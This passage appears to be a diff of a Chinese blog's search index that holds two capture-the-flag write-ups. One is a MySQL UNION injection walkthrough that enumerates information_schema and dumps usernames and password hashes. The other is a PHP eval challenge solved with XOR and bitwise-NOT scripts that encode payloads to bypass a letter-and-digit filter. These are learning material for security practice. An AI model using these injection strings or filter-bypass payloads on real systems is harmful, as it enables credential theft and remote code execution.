title="三、数据注入"></a>三、数据注入</h2><ul><li>在MySQL5.0以上的版本中，MySQL存在一个自带数据库名为<strong>information_schema</strong>，它是一个存储记录有所有数据库名，表名和列名的数据库，也相当于可以通过它获取指定数据库下面的表名或列名信息</li><li>数据库中用符号”<strong>.</strong>“代表下一级</li><li><strong>information_schema.tables</strong>：记录所有表名的表</li><li><strong>information_schema.columns</strong>：记录所有列名的表</li></ul><p>一、通过sql语句将数据库下的所有表名显示出来：</p><p><strong>?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=’mozhe_Discuz_StormGroup’</strong></p><p>如图：</p><p><img src="/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F-1/4.png" alt></p><p>二、再通过这个表名将下面的所有列名显示出来：<br><strong>?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=’StormGroup_member’</strong><br>如图：</p><p><img src="/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F-1/5.png" alt></p><p>三、只需要将<strong>name</strong>和<strong>password</strong>显示出来：<br><strong>?id=-1 union select 1,name,password,4 from StormGroup_member limit x,1</strong><br>因为可能存在多解情况，因此要逐个试一遍，让x=0，1，2…</p><p>最后的结果是：<br><strong>?id=-1 union select 1,name,password,4 from StormGroup_member limit 1,1</strong></p><p><img src="/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F-1/6.png" alt></p><p>将密码用md5解密，登录成功后即可获得key</p>]]></content>
+      
+      
       <categories>
-        <category>搞渗透</category>
+          
+          <category> 搞渗透 </category>
+          
       </categories>
-      <tags>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2021 GUET梦极光杯</title>
-    <url>/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<p>有一道web题，源码如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[A-Za-z0-9;()]/&quot;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo &quot;</span> . <span class="variable">$code</span> . <span class="string">&quot;;&quot;</span>);</span><br><span class="line">        <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">        ob_clean();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> === <span class="string">&quot;guetctf&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> getenv(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>很明显可以看到我们要构造 <strong>‘ code=guetctf ’</strong> 才能解开，但是正则表达式把所有的字母和数字都过滤掉了，因此我们要通过其他方法来进行绕过</p>
-<span id="more"></span>
-<h3 id="一、异或"><a href="#一、异或" class="headerlink" title="一、异或"></a>一、异或</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[A-Za-z0-9;()]/i&#x27;</span>; <span class="comment">//可以根据题目给的正则表达式进行修改</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">               &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)^urldecode(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>将上面的php脚本运行之后生成一个txt文档，里面包含了所有字符的异或构造结果 </p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\nyour input：&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>
-<p>接着运行上面的python脚本即可，运行结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">your input：guetctf</span><br><span class="line">&quot;%07%08%05%08%03%08%06&quot;^&quot;%60%7d%60%7c%60%7c%60&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="二、取反"><a href="#二、取反" class="headerlink" title="二、取反"></a>二、取反</h3><p>直接在命令行中运行这个php脚本即可</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;your input: &#x27;</span>);</span><br><span class="line"><span class="variable">$input</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*]&#x27;</span>.<span class="string">&#x27;~&#x27;</span>.urlencode(~<span class="variable">$input</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>运行结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">your input: guetctf</span><br><span class="line">[*]~%98%8A%9A%8B%9C%8B%99</span><br></pre></td></tr></table></figure>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> sql注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>2021 GUET梦极光杯</title>
+      <link href="/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F/"/>
+      <url>/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F/</url>
+      
+        <content type="html"><![CDATA[<p>有一道web题，源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[A-Za-z0-9;()]/&quot;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo &quot;</span> . <span class="variable">$code</span> . <span class="string">&quot;;&quot;</span>);</span><br><span class="line">        <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">        ob_clean();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> === <span class="string">&quot;guetctf&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> getenv(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显可以看到我们要构造 <strong>‘ code=guetctf ’</strong> 才能解开，但是正则表达式把所有的字母和数字都过滤掉了，因此我们要通过其他方法来进行绕过</p><span id="more"></span><h3 id="一、异或"><a href="#一、异或" class="headerlink" title="一、异或"></a>一、异或</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[A-Za-z0-9;()]/i&#x27;</span>; <span class="comment">//可以根据题目给的正则表达式进行修改</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">               &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)^urldecode(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将上面的php脚本运行之后生成一个txt文档，里面包含了所有字符的异或构造结果 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\nyour input：&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><p>接着运行上面的python脚本即可，运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">your input：guetctf</span><br><span class="line">&quot;%07%08%05%08%03%08%06&quot;^&quot;%60%7d%60%7c%60%7c%60&quot;</span><br></pre></td></tr></table></figure><h3 id="二、取反"><a href="#二、取反" class="headerlink" title="二、取反"></a>二、取反</h3><p>直接在命令行中运行这个php脚本即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;your input: &#x27;</span>);</span><br><span class="line"><span class="variable">$input</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*]&#x27;</span>.<span class="string">&#x27;~&#x27;</span>.urlencode(~<span class="variable">$input</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">your input: guetctf</span><br><span class="line">[*]~%98%8A%9A%8B%9C%8B%99</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>搞渗透</category>
+          
+          <category> 搞渗透 </category>
+          
       </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
 </search>
